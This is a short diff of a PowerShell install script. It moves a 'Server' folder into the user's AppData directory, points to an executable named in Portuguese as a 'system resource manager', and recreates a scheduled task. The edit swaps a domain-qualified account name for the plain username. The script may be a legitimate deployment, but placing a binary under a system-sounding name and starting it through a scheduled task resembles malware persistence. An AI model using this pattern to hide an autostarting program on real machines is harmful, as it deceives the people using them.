@@ -4,14 +4,15 @@ $dest = Join-Path $usrPath "AppData\Local\Server"
 Move-Item $env:LOCALAPPDATA\Server $dest -Force
 $exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
 
-$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
-$dmn = if ($realDmn) {
-    (Get-WmiObject Win32_ComputerSystem).Domain
-} else {
-    $env:COMPUTERNAME
-}
+#$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
+#$dmn = if ($realDmn) {
+#    (Get-WmiObject Win32_ComputerSystem).Domain
+#} else {
+#    $env:COMPUTERNAME
+#}
 
-$acc = "$dmn\$usr"
+#$acc = "$dmn\$usr"
+$acc = $usr
 $tsk = "GerenciadorRecursos"
 
 schtasks /delete /tn $tsk /f
